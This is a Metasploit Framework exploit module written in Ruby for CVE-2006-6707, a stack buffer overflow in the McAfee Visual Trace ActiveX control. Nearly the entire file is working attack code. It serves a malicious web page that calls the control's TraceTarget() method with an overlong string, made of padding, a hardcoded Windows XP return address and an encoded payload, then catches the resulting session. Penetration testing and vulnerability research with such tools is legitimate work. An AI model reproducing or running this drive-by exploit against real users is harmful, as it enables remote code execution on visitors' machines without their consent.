##
# $Id: mcafeevisualtrace_tracetarget.rb 10394 2010-09-20 08:06:27Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'McAfee Visual Trace ActiveX Control Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in the McAfee Visual Trace 3.25 ActiveX
				Control (NeoTraceExplorer.dll 1.0.0.1). By sending a overly long string to the
				"TraceTarget()" method, an attacker may be able to execute arbitrary code.
			},
			'License'        => MSF_LICENSE,
			'Author'         => [ 'MC' ],
			'Version'        => '$Revision: 10394 $',
			'References'     =>
				[
					[ 'CVE', '2006-6707'],
					[ 'OSVDB', '32399'],
					[ 'URL', 'http://secunia.com/advisories/23463' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'         => 800,
					'BadChars'      => "\x00\x09\x0a\x0d'\\",
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Windows XP Pro SP2 English',  { 'Offset' => 483, 'Ret' => 0x7c941eed } ],
				],
			'DisclosureDate' => 'Jul 7 2007',
			'DefaultTarget'  => 0))
	end

	def autofilter
		false
	end

	def check_dependencies
		use_zlib
	end

	def on_request_uri(cli, request)
		# Re-generate the payload
		return if ((p = regenerate_payload(cli)) == nil)

		# Randomize some things
		vname	= rand_text_alpha(rand(100) + 1)
		strname	= rand_text_alpha(rand(100) + 1)

		# Set the exploit buffer
		sploit = rand_text_alpha(target['Offset']) + [target.ret].pack('V') + p.encoded

		# Build out the message
		content = %Q|<html>
			<object classid='clsid:3E1DD897-F300-486C-BEAF-711183773554' id='#{vname}'></object>
			<script language='javascript'>
			var #{vname} = document.getElementById('#{vname}');
			var #{strname} = new String('#{sploit}');
			#{vname}.TraceTarget(#{strname});
			</script>
			</html>
			|

		print_status("Sending exploit to #{cli.peerhost}:#{cli.peerport}...")

		# Transmit the response to the client
		send_response_html(cli, content)

		# Handle the payload
		handler(cli)
	end

end
